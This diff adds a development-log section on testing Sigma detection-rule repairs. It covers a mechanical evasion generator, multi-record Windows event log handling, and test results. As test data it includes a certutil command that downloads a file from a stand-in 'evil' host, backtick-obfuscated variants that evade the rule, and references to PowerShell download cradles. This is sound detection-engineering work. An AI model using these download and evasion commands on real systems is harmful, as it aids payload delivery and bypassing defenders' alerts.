@@ -2197,3 +2197,278 @@ pass, no regressions.
 See `docs/stage3-phase1-status.md` for the honest go/no-go assessment this
 phase's results support.
 
+# Stage 3, Phase 2: deterministic evasion transformer + multi-record accounting + mechanical re-run
+
+Scope of this phase, deliberately: close the two gaps Phase 1 named -
+**no evasion transformer** (condition 1, `EVASIONS_CAUGHT`, was only ever
+exercised by one hand-picked evasion per rule) and **no multi-record EVTX
+accounting** - then re-run all five Phase 1 hand-made repairs through the
+full gate with mechanically-generated evasions instead of hand-picked ones.
+Still no LLM anywhere in this phase; the five repairs are unchanged from
+Phase 1. See `docs/stage3-phase1-status.md` for the two gaps as stated
+there, and `docs/stage3-phase2-status.md` for the go/no-go decision this
+phase's results feed into.
+
+## Part 1 — the evasion transformer (`mechanic/evasion.py`)
+
+Implements Uetz et al.'s ("You Cannot Escape Me," USENIX Sec 2024) five
+evasion technique classes as deterministic string transforms:
+**character insertion**, **synonymous substitution**, **omission**,
+**reordering**, **recoding**. Each is a pure function over a field name and
+a literal; none of them call RSigma or make any claim about whether the
+result is a real evasion.
+
+**Honesty constraint, stated here as required and enforced in the code's
+own docstrings:** these five techniques define both the evasions this
+transformer can produce *and, implicitly, the outer bound of what a repair
+verified against them has actually been shown to resist*. A repair that
+passes `EVASIONS_CAUGHT` against every mechanical candidate has been
+verified against a known, bounded evasion space - not against a creative
+human adversary. Uetz's full external, expert-crafted evasion set remains
+worth requesting for a later phase; nothing here substitutes for it, and
+every place this phase reports a PASS built on mechanical evasions says so.
+
+**Design: the transformer suggests, the harness decides.** Two separate
+steps, never merged:
+
+1. `fragile_atoms_for_rule(rule_path)` reuses `mechanic.fragility.classify_rule`
+   unmodified (the same classifier Stage 2 already runs for triage) to find
+   the atom(s) tied for the rule's own tier - it does not re-derive
+   fragility logic.
+2. `generate_evasions()` produces `EvasionVariant` candidates from that
+   atom, each carrying its technique name as provenance. `confirm_real_evasions()`
+   then runs every candidate through `verify.evaluate()` against the
+   **original** rule: only a candidate the original rule no longer catches
+   is kept, as a `ConfirmedEvasion`; everything else is discarded with a
+   stated reason (`"original rule still fires on this candidate"` or
+   `"harness returned UNVERIFIABLE for this candidate"`). The transformer
+   never asserts a variant is a real evasion - only the harness's own
+   re-evaluation of the unmodified original rule can establish that.
+
+**Field-category gating is what makes the "don't manufacture fake
+evasions" requirement hold, with no special-casing per test case.**
+`_field_category()` classifies a field as `commandline` (all 5 techniques
+apply - it's text a shell/interpreter actually parses), `path_identity`
+(only recoding applies - an opaque, case-insensitive filesystem path that
+nothing parses token-by-token), or `other` (zero candidates - raw IOCs and
+protocol/OS-defined literals). One mechanism, applied uniformly, correctly
+produces zero candidates for both required "can't be cheaply evaded" cases
+in Part 2 below.
+
+## Part 2 — validating the transformer on known-answer cases
+
+`tests/test_evasion.py`, 8 tests, all passing:
+
+| Case | What it proves |
+|---|---|
+| `test_each_technique_produces_the_hand_computed_literal` | all 5 techniques, hand-computed expected output vs. actual, for each technique independently |
+| `test_recoding_also_applies_to_path_identity_fields_but_nothing_else_does` | field-category gating restricts a `path_identity` field to recoding only |
+| `test_non_process_fields_get_no_candidates_at_all` | `DestinationIp` (raw IOC) -> zero candidates from all 5 techniques |
+| `test_reordering_candidate_confirmed_as_real_evasion_by_harness` | a generated reordering candidate for R2, run live through RSigma against the **original** rule, is confirmed a real evasion (original no longer fires) |
+| `test_recoding_candidate_correctly_discarded_when_original_still_fires` | a generated recoding candidate for R1, run live through RSigma, is correctly **discarded** because Sigma's default case-insensitivity means the original still fires on it - the transformer does not get to just assume its own output evades |
+| `test_protected_registry_literal_yields_zero_candidates` | a rule keyed on a fixed registry autorun path (`...\CurrentVersion\Run\...`) yields **zero** evasion candidates - a protected/unrenameable literal must not manufacture fake evasions |
+| `test_protected_registry_literal_end_to_end_pipeline_produces_no_evasions` | same case, through the full `generate_confirmed_evasions_for_rule` pipeline end to end |
+| `test_generate_confirmed_evasions_for_rule_returns_labeled_events` | the convenience function returns `gate.LabeledEvent`s ready to feed straight into the gate |
+
+All 8 pass, including two live-RSigma round trips confirming the harness -
+not the transformer - is the authority on realness, in both directions
+(one confirmed real, one correctly rejected).
+
+## Part 3 — multi-record EVTX accounting (`mechanic/verify.py`)
+
+Phase 1 left any EVTX file with more than one record as a single
+`UNVERIFIABLE` aggregate - there was no way to correlate a firing match
+back to which record produced it, since RSigma's `engine eval` only emits
+match lines for records that actually fired.
+
+**Fix**: discovery now always also resolves `EventRecordID` (documented by
+Microsoft as unique per channel) alongside the rule's own fields. A
+trivial always-true wildcard rule (`EventRecordID: '*'`) enumerates every
+record in the file independently, using the exact same auto-discovered
+pipeline as the real rule; real-rule matches are then correlated back onto
+that enumeration by `EventRecordID`. Every step fails closed to a single
+aggregate `UNVERIFIABLE` for the whole file if `EventRecordID` can't be
+resolved, or if the enumeration pass's own counts don't add up - the
+existing trusted/`UNVERIFIABLE` guards from Phase 1 still apply per record,
+they're just no longer forced to collapse the whole file into one outcome.
+
+**A third silent-zero-shaped bug, found building this**: classic, legacy
+(non-manifested) Windows Event Log `<Data>` elements have no `Name`
+attribute at all (unlike Sysmon's named `EventData`), so RSigma reports
+them at a path ending `.../Data/#text`, not `.../Data`. The existing
+last-dot-segment field-discovery match failed silently on this shape
+(`unresolved: ['Data']`). Fixed with a `_match_key()` helper that strips a
+trailing `.#text` before comparing (the mapping value still keeps the full
+path) - found and fixed the same way as the two Phase 1 instances: an
+empirical probe, not a guess.
+
+**Fixture**: `tests/fixtures/evtx/multi_record_application_markers.evtx` -
+5 records genuinely written to this machine's own Windows Application
+event log (`Write-EventLog`, event ID 9911, source "Application Error",
+non-admin) and exported with `wevtutil epl`, the same real Windows
+export path any forensic capture goes through. Ground truth (3
+`"MALICIOUS"` markers at positions 0/2/4, 2 `"benign"` markers at 1/3) was
+independently read back with `wevtutil qe` - a tool with nothing to do
+with RSigma or mechanic - **before** the file was ever handed to the
+harness, the same "independently-sourced known answer" discipline as
+Phase 1's SigmaHQ fixtures.
+
+`tests/test_verify_multirecord.py`, 5 tests, all passing:
+
+| Case | Known answer (source) | Result |
+|---|---|---|
+| `test_multirecord_fixture_exists_and_has_five_records` | fixture must exist | ✅ |
+| `test_multi_record_known_composition_malicious_rule` | `[True, False, True, False, True]` per record (`wevtutil qe`) | ✅ exact match, `trusted_fired_count=3`, `trusted_no_fire_count=2`, all `trusted` |
+| `test_multi_record_known_composition_benign_rule_is_the_exact_complement` | exact complement of the above, independent rule keyed on the other marker | ✅ exact complement |
+| `test_multi_record_field_mismatch_poisons_every_record_not_silently_some` | a whole-file schema problem (rule references a field this event source never has) must poison every record | ✅ all 5 records `unverifiable`, none silently averaged into a clean count |
+| `test_multi_record_outcomes_carry_a_record_identifying_label` | every outcome must be traceable to its own record | ✅ 5 distinct `EventRecordID=`-prefixed labels |
+
+All 5 pass.
+
+## Part 4 — re-running the five hand repairs through the full gate with mechanical evasions
+
+`tests/test_gate_mechanical_evasions.py`. Same rules, same original-TP
+events, same benign sets as Phase 1's `tests/test_gate_hand_repairs.py`
+(imported directly as constants, so there is no risk of silently testing a
+different rule) - only the evasion events change: instead of one
+hand-authored evasion per case, `mechanic.evasion.generate_confirmed_evasions_for_rule`
+finds the rule's own fragile atom(s) and generates + confirms every
+mechanical candidate it can.
+
+| # | Fragile atom / tier | Mechanical evasions confirmed | Verdict (mechanical) | Phase 1 verdict | Match? |
+|---|---|---|---|---|---|
+| R1 | `Image` filename, tier Tool | 0 | **PASS** | PASS | ✅ (but `EVASIONS_CAUGHT` not applicable — see below) |
+| R2 | `CommandLine` (`certutil -urlcache -f`), tier Tool | 5 (3 char-insertion, 2 reordering) | **FAIL** | PASS | ❌ flips — genuine finding, see below |
+| R3 | `CommandLine` (IEX/WebClient cradle), tier Tool | 6 (4 char-insertion, 2 reordering) | **FAIL** | FAIL | ✅ |
+| R4 | same as R3 | 6 | **FAIL** | FAIL | ✅ |
+| R5 | `DestinationIp`, tier IOC | 0 | **PASS** | FAIL | ❌ flips — the key finding, see below |
+
+**R1 — PASS, but not fully exercised.** Zero mechanical evasions exist for
+a bare filename atom: none of the five Uetz techniques semantically apply
+to a value like `whoami.exe` sitting in a filename-endswith match the way
+they apply to shell-parsed text (the real evasion class here is *rename*,
+which is outside the five techniques' scope by design). `EVASIONS_CAUGHT`
+comes back `applicable: false` (`"reasons": ["no evasion events supplied"]`),
+and `gate.fully_exercised` is `False`. The PASS is real - no regression on
+the TP/benign set - but it is not evidence R1's `OriginalFileName` fix
+resists evasion; Phase 1's hand-picked rename evasion is still the only
+thing that ever exercised that claim.
+
+**R2 — flips to FAIL. Genuine finding, with an important caveat.** Phase
+1's single hand-picked evasion (reordering the two flags) is reproduced
+here too and the repair still resists it (`"certutil.exe -f -urlcache
+http://evil/a.exe a.exe"` is in the confirmed set, and `contains|all`
+still catches it). But mechanical generation also found a
+character-insertion candidate that fragments the literal token
+`-urlcache` itself - a token *both* the original and the repaired
+`contains|all: [-urlcache, -f]` rule depend on - so it evades the repair
+too:
+
+```json
+{
+  "name": "EVASIONS_CAUGHT",
+  "status": "trusted",
+  "passed": false,
+  "applicable": true,
+  "evidence": {
+    "count": 5,
+    "provenance": [
+      "mechanical[character_insertion]: CommandLine 'certutil.exe -urlcache -f' -> 'c`e`r`t`u`t`i`l.exe -urlcache -f'",
+      "mechanical[character_insertion]: CommandLine 'certutil.exe -urlcache -f' -> 'certutil.e`x`e -urlcache -f'",
+      "mechanical[character_insertion]: CommandLine 'certutil.exe -urlcache -f' -> 'certutil.exe -u`r`l`c`a`c`h`e -f'",
+      "mechanical[reordering]: CommandLine 'certutil.exe -urlcache -f' -> '-urlcache certutil.exe -f'",
+      "mechanical[reordering]: CommandLine 'certutil.exe -urlcache -f' -> 'certutil.exe -f -urlcache'"
+    ],
+    "repaired_fired": [true, true, false, true, true],
+    "original_fired": [false, false, false, false, false]
+  },
+  "reasons": ["event(s) at index [2] did not fire"]
+}
+```
+
+`gate.fully_exercised` is `True` here - every condition was checked. This
+is genuine broader coverage the hand-picked Phase 1 evasion never reached.
+**Operational-realism caveat, stated plainly because it matters**: the
+harness confirms this candidate breaks the rule's literal-text match, not
+that it is a command a real interpreter would actually execute. Backtick
+(`` ` ``) insertion is a PowerShell escape convention; this event's `Image`
+is `certutil.exe`, which real-world instances of this technique
+overwhelmingly launch via `cmd.exe`, not PowerShell, so a backtick
+mid-token may not correspond to real attacker-executable syntax for this
+specific launcher. The finding that the repair's `-urlcache` dependency is
+fragile is real either way (character-insertion breaking a load-bearing
+literal token is a legitimate class of concern regardless of shell); the
+finding that *this exact string* is what an attacker would run is not
+established by the harness and should not be reported as such.
+
+**R3 — FAIL, matches Phase 1, now on 6 confirmed evasions instead of 1.**
+`EVASIONS_CAUGHT` still passes (the over-broad repair catches all 6, for
+the same reason it's over-broad); `NO_NEW_FALSE_POSITIVES` still fails,
+identical evidence shape to Phase 1 (`new_fps: [0, 1, 2]`). The
+load-bearing case holds under a larger evasion set.
+
+**R4 — FAIL, matches Phase 1, now stronger evidence.** None of the 6
+mechanical evasions are caught (Phase 1 only had 1 to test), so
+`EVASIONS_CAUGHT` fails with `repaired_fired: [false, false, false, false,
+false, false]` - the same conclusion, now on 6x the evidence.
+
+**R5 — flips to PASS. The most important finding of Part 4.** Zero
+mechanical evasions exist for `DestinationIp` - it is a raw IOC, not
+command-line-shaped text, so none of the 5 Uetz techniques semantically
+apply (correctly - manufacturing a "recoded IP" would be exactly the fake
+evasion this transformer is designed never to produce). With no evasion
+events supplied, `EVASIONS_CAUGHT` is `applicable: false` again, and the
+verdict rests entirely on conditions 2-4, which the widened-but-still-not-
+durable (`/24`) repair trivially satisfies:
+
+```json
+{
+  "verdict": "PASS",
+  "conditions": [
+    {"name": "EVASIONS_CAUGHT", "passed": null, "applicable": false,
+     "reasons": ["no evasion events supplied"]},
+    {"name": "ORIGINAL_STILL_CAUGHT", "passed": true, "applicable": true},
+    {"name": "NO_NEW_FALSE_POSITIVES", "passed": true, "applicable": true},
+    {"name": "INTENT_PRESERVED", "passed": true, "applicable": true}
+  ]
+}
+```
+
+`gate.fully_exercised` is `False`. **This is not the gate misbehaving** -
+given its inputs (zero evasion events, because zero exist for this field
+category) it did exactly what Phase 1 proved it should do. It is real
+evidence that **mechanical evasions alone provide zero coverage of
+condition 1 for any rule whose fragile atom is a raw IOC**, and a repair
+for such a rule can reach an undeserved PASS resting entirely on
+conditions 2-4. Phase 1's hand-picked evasion (rotating to a different
+/24) is what caught this repair as insufficient; nothing mechanical
+reproduces that judgment, by design, because IOC rotation isn't one of
+Uetz's five text-transform techniques.
+
+### `GateReport.fully_exercised` (new, additive, not a verdict-logic change)
+
+Added to `mechanic/gate.py` specifically because of the R1/R5 pattern
+above: `all(c.applicable for c in self.conditions)`. It does not change
+any pass/fail logic - R1 and R5 pass exactly as they did before this
+property existed - it only surfaces, in the report itself, that a PASS
+rested on fewer than all four conditions actually being checked, so a
+caller can tell a fully-tested PASS from a weaker one without re-deriving
+it from the condition list by hand. Full test suite re-confirmed passing
+after this addition (additive only).
+
+### Reproducing this phase
+
+```
+export MECHANIC_RSIGMA_BIN=/path/to/pinned/rsigma   # v0.21.0, see docs/stage3-harness-evaluation.md
+pytest tests/test_evasion.py -v                  # Part 2: transformer known-answer validation
+pytest tests/test_verify_multirecord.py -v       # Part 3: multi-record EVTX accounting
+pytest tests/test_gate_mechanical_evasions.py -v # Part 4: mechanical re-run of the 5 hand repairs
+```
+
+Full suite (128 tests, including all pre-existing Stage 1/2/3-Phase-1
+tests): all pass, no regressions.
+
+See `docs/stage3-phase2-status.md` for the honest go/no-go assessment this
+phase's results support, including the explicit recommendation on how a
+future probabilistic repair generator must treat `gate.fully_exercised`.
+
